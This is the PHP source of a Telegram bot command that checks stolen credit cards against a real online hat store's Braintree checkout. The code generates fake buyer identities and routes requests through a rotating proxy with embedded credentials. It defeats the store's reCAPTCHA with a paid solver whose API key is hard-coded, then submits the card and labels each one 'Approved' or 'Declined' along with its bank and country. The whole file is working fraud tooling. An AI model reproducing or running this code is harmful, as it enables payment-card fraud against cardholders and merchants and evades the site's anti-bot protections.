<?php

require __DIR__ . "/../Class/Capsolver/autoload.php";


$gatewayname="br";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Braintree_Charged (".'$5'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($year) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);
 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "gw.dataimpulse.com:823";
 $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 

$response = CurlX::Get(
    "https://www.hats.com/melin-10-stacked-decal-st002?___store=default&nosto=nosto-page-category1-copy",
    null,
    $cookie,
    $proxies
);

$action = CurlX::ParseString($response->body,'action="https://www.hats.com/checkout/cart/add/uenc/','"');
$form_key = CurlX::ParseString($response->body,'<input name="form_key" type="hidden" value="','"');



$data = array(
    "product" => "128025",
    "selected_configurable_option" => "",
    "related_product" => "",
    "item" => "128025",
    "form_key" => $form_key,
    "super_attribute" => array(
        "92" => "116",
        "190" => "2621"
    ),
    "qty" => 1
);




$response = CurlX::Post(
    "https://www.hats.com/checkout/cart/add/uenc/$action",
    http_build_query($data),
    [
        'Accept: application/json, text/javascript, */*; q=0.01',
        'Connection: keep-alive',
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        'cookie: form_key='.$form_key.'',
        'Origin: https://www.hats.com',
        'Referer: https://www.hats.com/melin-hydro-a-game-baseball?___store=default&nosto=frontpage-nosto-1-copy-copy-2-fallback-nosto-1',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);

$response = CurlX::Get(
    "https://www.hats.com/checkout/",
    null,
    $cookie,
    $proxies
);

$entity_id = CurlX::ParseString($response->body,'"entity_id":"','"');
$clientToken = base64_decode(CurlX::ParseString($response->body,'"isActive":true,"clientToken":"','"'));
$authorizationFingerprint = CurlX::ParseString($clientToken,'"authorizationFingerprint":"','"');


$response = CurlX::Post(
    "https://www.hats.com/rest/default/V1/guest-carts/$entity_id/estimate-shipping-methods",
    '{"address":{"street":["'.$street.'"],"city":"new york","region_id":"43","region":"New York","country_id":"US","postcode":"10080","firstname":"luis","lastname":"perez","company":"org","telephone":"323"}}',
    [
        'Accept: */*',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://www.hats.com',
        'Referer: https://www.hats.com/checkout/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);
 $methodcode = CurlX::ParseString($response->body,'"method_code":"','"');

$response = CurlX::Post(
    "https://www.hats.com/rest/default/V1/guest-carts/$entity_id/shipping-information",
    '{"addressInformation":{"shipping_address":{"countryId":"US","regionId":"18","regionCode":"'.$state_id.'","region":"Florida","street":["'.$street.'"],"company":"","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"alex","lastname":"torres"},"billing_address":{"countryId":"US","regionId":"18","regionCode":"'.$state_id.'","region":"Florida","street":["'.$street.'"],"company":"","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"alex","lastname":"torres","saveInAddressBook":null},"shipping_method_code":"'.$methodcode.'","shipping_carrier_code":"matrixrate","extension_attributes":{"kl_sms_consent":false,"kl_email_consent":false}}}',
    [
        'Accept: */*',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://www.hats.com',
        'Referer: https://www.hats.com/checkout/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest'
    ],
    $cookie,
    $proxies
);


$response = CurlX::Post(
    "https://payments.braintree-api.com/graphql",
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"5dd90efa-020e-49f5-8ed8-982f35614230"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    [
        'Accept: */*',
        'Authorization: Bearer '.$authorizationFingerprint.'',
        'Braintree-Version: 2018-05-10',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://assets.braintreegateway.com',
        'Referer: https://assets.braintreegateway.com/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
    ],

    $cookie,
    $proxies
);

$data = json_decode($response->body, true); 
echo $token = $data['data']['tokenizeCreditCard']['token']; 

$solver = new \Capsolver\CapsolverClient('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');


$solution = $solver->recaptchav2(
    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
    [
      'websiteURL'    => 'https://www.hats.com/',
      'websiteKey'    => '6LdoPNwUAAAAAG46l1cFG_EsT_l0qiOhNBs3dcxX',
    ]
);

echo $captcha = $solution["gRecaptchaResponse"];


$response = CurlX::Post(
    "https://www.hats.com/rest/default/V1/guest-carts/$entity_id/payment-information",
    '{"cartId":"'.$entity_id.'","billingAddress":{"countryId":"US","regionId":"43","regionCode":"NY","region":"New York","street":["'.$street.'"],"company":"org","telephone":"'.$phone.'","postcode":"'.$zip.'","city":"'.$city.'","firstname":"luis","lastname":"perez","saveInAddressBook":null},"paymentMethod":{"method":"braintree","additional_data":{"payment_method_nonce":"'.$token.'","device_data":"{\"correlation_id\":\"ee31f264e13d70fbb89842619c881ea2\"}","cardBin":"'.$bin.'","cardLast4":"'.$lastFourDigits.'"},"extension_attributes":{"agreement_ids":[]}},"email":"'.$email.'"}',
    [
        'Accept: */*',
        'Connection: keep-alive',
        'Content-Type: application/json',
        'Origin: https://www.hats.com',
        'Referer: https://www.hats.com/checkout/',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
        'X-Requested-With: XMLHttpRequest',
        'X-ReCaptcha: '.$captcha.'',
    ],
    $cookie,
    $proxies
);

 //==================[Manejo de los mensajes]======================//
$errormessage = CurlX::ParseString($response->body,'"message":"Your payment could not be taken. Please try again or use a different payment method.','"');
$errormessage=trim($errormessage);
if($errormessage=="null"){
    $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);
} 
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if($errormessage == "Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "Card Issuer Declined CVV",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Insufficient Funds"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Your account was created successfully"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved Auth!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Gateway Rejected: avs"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        $errormessage,
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
